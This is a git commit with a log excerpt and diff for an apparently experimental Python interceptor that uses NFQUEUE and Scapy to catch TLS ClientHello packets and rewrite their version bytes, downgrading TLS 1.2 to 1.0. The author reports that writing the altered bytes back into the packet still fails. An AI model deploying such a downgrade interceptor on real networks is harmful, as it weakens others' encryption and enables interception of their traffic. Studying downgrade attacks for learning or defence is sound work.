4c29c1c771e92ef42f4949868294d263e97daf18
Tess Sluijter <tsluyter@kilala.nl>
2020-10-08 15:50:41 +0200

    Just about everything works, except for actually inputting the darn message into the packet. I just can't get the right format for it.
    Running the interceptor now shows this logging:
    ('Binding to NFQUEUE', 0)
    ...
    ...
    ...
    TLS handshake found, client HELLO.
    ...
    ...
    ...
    ...
    ...
    ...
    ...
    ...
    TLS handshake found, client HELLO.
    TLS v1.2, dropping down to v1.0
    ('msgB is: ', <type 'str'>)
    ('msgB2 is: ', <type 'list'>)
    ('Byte 61 is now: ', '\x03', '. Needs to change to 0x03.')
    ('Byte 62 is now: ', '\x03', '. Needs to change to 0x01.')
    ('Byte 61 is now: ', '\x03', '.')
    ('Byte 62 is now: ', '\x01', '.')
    ...
    ...
    
    All of that is good. I just can't get byte array to go back into pkt.set_payload().

--- TLS-downgrade/interceptor.py
+++ TLS-downgrade/interceptor.py
@@ -25,9 +25,9 @@ def packetReceived(pkt):
     pkt.accept();
 
   else:
-    tcpPayload = ip["Raw"].load;                                          
-                                            
-    # Adjusted the matching rules for Python 2 and old Scapy.
+    tcpPayload = ip["Raw"].load                                             
+                                                                            
+    # Adjusted the matching rules for Python 2 and old Scapy.               
     if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
       print("TLS handshake found, client HELLO.")                                      
                                                                                        
@@ -35,12 +35,23 @@ def packetReceived(pkt):
         print("TLS v1.2, dropping down to v1.0")                                       
         msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it            
         msgBytes2 = [b for b in msgBytes]                                              
-        msgBytes2[9] = 0x03                                                            
-        msgBytes2[10] = 0x01                                                           
-        pkt.set_payload(bytes(msgBytes2))                                              
                                                                                        
-      pkt.accept() 
-    else:
+        print("msgB is: ", type(msgBytes))                                             
+        print("msgB2 is: ", type(msgBytes2))                                           
+        print("Byte 61 is now: ", msgBytes2[61], ". Needs to change to 0x03.")         
+        print("Byte 62 is now: ", msgBytes2[62], ". Needs to change to 0x01.")         
+                                                                                       
+        msgBytes2[61] = '\x03'                                                         
+        msgBytes2[62] = '\x01'                                                         
+                                                                                       
+        print("Byte 61 is now: ", msgBytes2[61], ".")                                  
+        print("Byte 62 is now: ", msgBytes2[62], ".")                                  
+                                                                                       
+#        pkt.set_payload(bytes(msgBytes2))                                             
+        pkt.set_payload(msgBytes)                                                      
+                                                                                       
+      pkt.accept()                                                                     
+    else:                                                                              
       pkt.accept();
 
 print("Binding to NFQUEUE", nfQueueID)
